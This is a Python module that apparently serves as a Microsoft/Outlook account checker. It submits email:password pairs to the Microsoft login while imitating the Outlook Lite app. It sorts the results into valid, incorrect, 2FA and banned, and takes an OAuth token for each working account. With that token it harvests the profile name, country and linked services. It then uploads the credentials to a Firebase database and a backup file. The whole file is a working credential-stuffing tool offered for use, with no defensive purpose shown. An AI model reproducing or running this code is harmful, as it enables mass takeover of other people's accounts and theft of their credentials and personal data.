import asyncio
import logging
import re
import random
import requests
import pycountry
from typing import List, Dict, Optional, Tuple
from datetime import datetime, timezone
import aiohttp
import aiofiles

from config import COMMON_COUNTRY_NAMES, SERVICE_DOMAINS, REQUEST_TIMEOUT, FIREBASE_DB_URL, BACKUP_FILE_PATH

logger = logging.getLogger(__name__)

def get_country_name_and_flag(country_code: str) -> Tuple[str, str]:
    if not country_code or len(country_code) != 2: return "Unknown", '❔'
    try:
        country = pycountry.countries.get(alpha_2=country_code.upper())
        if not country: return "Unknown", '❔'
        flag = ''.join(chr(ord(c) + 127397) for c in country.alpha_2)
        official_name = country.name
        name = COMMON_COUNTRY_NAMES.get(official_name, official_name)
        return name, flag
    except Exception: return "Unknown", '❔'

def get_services_from_startup_data(response_text: str) -> List[str]:
    found_services = set()
    emails_found = re.findall(r'[\w\.\-]+@[\w\.\-]+\.[\w\.\-]+', response_text)
    for email in emails_found:
        try:
            domain = email.split('@')[1]
            if domain in SERVICE_DOMAINS:
                found_services.add(SERVICE_DOMAINS[domain])
        except IndexError: continue
    return sorted(list(found_services))

def get_infoo(session: requests.Session, email: str, token: str, cid: str) -> dict:
    details = {'name': 'N/A', 'country': 'Unknown', 'services': []}
    try:
        headers = {"User-Agent": "Outlook-Android/2.0", "Pragma": "no-cache", "Accept": "application/json", "ForceSync": "false", "Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}", "Host": "substrate.office.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"}
        response = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=REQUEST_TIMEOUT)
        if response.status_code == 200:
            profile_data = response.json()
            # Fix: Ensure 'names' exists before accessing it
            if profile_data.get('names'): details['name'] = profile_data['names'][0].get('displayName', 'N/A')
            if profile_data.get('accounts'):
                location_code = profile_data['accounts'][0].get('location', '')
                country_name, _ = get_country_name_and_flag(location_code)
                details['country'] = country_name
        outlook_headers = {"Host": "outlook.live.com", "content-length": "0", "x-owa-sessionid": cid, "x-req-source": "Mini", "authorization": f"Bearer {token}", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36", "action": "StartupData", "x-owa-correlationid": cid, "ms-cv": "YizxQK73vePSyVZZXVeNr+.3", "content-type": "application/json; charset=utf-8", "accept": "*/*", "origin": "https://outlook.live.com", "x-requested-with": "com.microsoft.outlooklite", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://outlook.live.com/", "accept-encoding": "gzip, deflate", "accept-language": "en-US,en;q=0.9"}
        outlook_response = session.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0", headers=outlook_headers, data="", timeout=REQUEST_TIMEOUT)
        if outlook_response.status_code == 200: details['services'] = get_services_from_startup_data(outlook_response.text)
    except Exception: pass
    return details

def get_token(session: requests.Session, email: str) -> Optional[dict]:
    try:
        code = session.headers.get('Location', '').split('code=')[1].split('&')[0]
        cid = session.cookies.get('MSPCID', '').upper()
        token_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
        token_data = {"client_info": "1", "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59", "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D", "grant_type": "authorization_code", "code": code, "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
        response = session.post(token_url, data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=REQUEST_TIMEOUT)
        if response.status_code == 302: # Should be 302 for redirect to get token
            session.headers.update(response.headers)
            details = get_token(session, email)
            return details
        if response.status_code == 200:
            token = response.json().get("access_token")
            if token: return get_infoo(session, email, token, cid)
    except Exception: pass
    return None

def get_values_and_login(session: requests.Session, email: str, password: str) -> Tuple[Optional[Dict], Optional[str]]:
    try:
        ua = "Mozilla/5.0 (Linux; Android 11; SM-A105F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
        get_headers = {"upgrade-insecure-requests": "1", "user-agent": ua, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.microsoft.outlooklite", "accept-encoding": "gzip, deflate", "accept-language": "en-US,en;q=0.9"}
        auth_url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&mkt=en&response_type=code&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
        resp1 = session.get(auth_url, headers=get_headers, timeout=REQUEST_TIMEOUT)
        if resp1.status_code != 200: return None, f"Network Error ({resp1.status_code})"
        html_content = resp1.text
        if "IfExistsResult\":1" in html_content: return None, "Account Not Found"
        ppft, pl = None, None
        server_data_match = re.search(r'var ServerData\s*=\s*({.*?});', html_content)
        if server_data_match:
            server_data_text = server_data_match.group(1)
            sft_match = re.search(r'"sFT":"<input type=\\"hidden\\" name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)\\"', server_data_text)
            if sft_match: ppft = sft_match.group(1)
            if not ppft:
                sfttag_match = re.search(r'"sFTTag":"<input type=\\"hidden\\" name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)\\"', server_data_text)
                if sfttag_match: ppft = sfttag_match.group(1)
            pl_match = re.search(r'"urlPost":"([^"]+)"', server_data_text)
            if pl_match: pl = pl_match.group(1)
        if not ppft or not pl:
            ppft_match_legacy = re.search(r'name="PPFT" id="i0327" value="([^"]+)"', html_content)
            pl_match_legacy = re.search(r"urlPost:'([^']+)'", html_content)
            if ppft_match_legacy and pl_match_legacy:
                ppft = ppft_match_legacy.group(1)
                pl = pl_match_legacy.group(1)
        if not ppft or not pl: return None, "Page Parse Error"
        post_content = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772"
        post_headers = {"User-Agent": ua, "Pragma": "no-cache", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Connection": "keep-alive", "Content-Length": str(len(post_content)), "Cache-Control": "max-age=0", "Origin": "https://login.live.com", "X-Requested-With": "com.microsoft.outlooklite", "Referer": resp1.url, "Accept-Encoding": "gzip, deflate", "Accept-language": "en-US,en;q=0.9", "Content-Type": "application/x-www-form-urlencoded"}
        resp2 = session.post(pl, data=post_content, headers=post_headers, allow_redirects=False, timeout=REQUEST_TIMEOUT)
        if resp2.status_code == 302 and 'Location' in resp2.headers and 'oauth20_desktop.srf' in resp2.headers['Location']:
            session.headers.update(resp2.headers)
            details = get_token(session, email)
            return details, None if details else "Token Error"
        resp2_text = resp2.text
        if "account or password is incorrect" in resp2_text: return None, "Incorrect Credentials"
        if "https://account.live.com/recover" in resp2_text: return None, "2FA / Recovery Needed"
        if "https://account.live.com/Abuse" in resp2_text: return None, "Account Blocked"
        if "too many times" in resp2_text: return None, "Too Many Attempts (Ban)"
        return None, "Unknown Login Error"
    except requests.exceptions.RequestException: return None, "Network Error"
    except Exception: return None, "Critical Error"

async def run_sync_in_executor(func, *args):
    return await asyncio.get_running_loop().run_in_executor(None, func, *args)

async def check_account(email: str, password: str) -> Tuple[Optional[Dict], Optional[str]]:
    session = requests.Session()
    return await run_sync_in_executor(get_values_and_login, session, email, password)

async def upload_to_firebase(account_data: Dict) -> Optional[str]:
    payload = {
        "email": account_data["email"],
        "password": account_data["password"],
        "country": account_data.get("country", "Unknown"),
        "services": account_data.get("services", []),
        "createdAt": datetime.now(timezone.utc).isoformat(),
        "reportCount": 0
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(FIREBASE_DB_URL + "accounts.json", json=payload) as response:
                if response.status == 200:
                    data = await response.json()
                    doc_id = data['name']
                    logger.info(f"Uploaded {account_data['email']} to Firebase with ID: {doc_id}")
                    return doc_id
    except Exception as e:
        logger.error(f"Error during Firebase upload for {account_data['email']}: {e}")
    return None

async def save_to_backup_file(account_data: Dict):
    try:
        async with aiofiles.open(BACKUP_FILE_PATH, mode='a', encoding='utf-8') as f:
            await f.write(f"{account_data['email']}:{account_data['password']} | Country: {account_data.get('country', 'Unknown')} | Services: {', '.join(account_data.get('services', []))}\n")
    except Exception as e:
        logger.error(f"Failed to write to backup file: {e}")

def format_result_message(account_data: Dict, save_to_db: bool) -> str:
    name_str = account_data.get("name", "N/A")
    services_str = ", ".join(account_data.get("services", [])) or "No linked services found"
    country_name, country_flag = get_country_name_and_flag(account_data.get('country', 'Unknown'))
    
    status_line = "✅ **Valid Account Details**"
    if save_to_db:
        status_line += "\n💾 **Saved to Database**"
        
    return (f"{status_line}\n"
            f"➖➖➖➖➖➖➖➖➖➖➖➖\n"
            f"👤 **Name:** {name_str}\n"
            f"📧 **Email:** `{account_data['email']}`\n"
            f"🔑 **Password:** `{account_data['password']}`\n"
            f"🌍 **Country:** {country_flag} *{country_name}*\n"
            f"🔗 **Linked Services:** {services_str}\n"
            f"➖➖➖➖➖➖➖➖➖➖➖➖")
